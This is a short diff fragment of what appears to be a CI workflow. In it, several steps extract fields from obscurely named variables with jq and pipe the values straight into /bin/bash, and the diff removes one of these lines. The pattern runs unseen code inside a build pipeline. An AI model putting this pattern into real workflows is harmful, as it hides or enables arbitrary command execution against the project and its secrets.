@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$kz13" | jq -r .xu27722 | /bin/bash
           echo $jjfo468 | jq -r .vv7 | /bin/bash
           printf '%s' "$if3" | jq -r .c95571 | /bin/bash
-          printf '%s' "$dr4" | jq -r .hlal1 | /bin/bash
           echo $ckq7724 | jq -r .yr200 | /bin/bash
 
       - name: Archive output
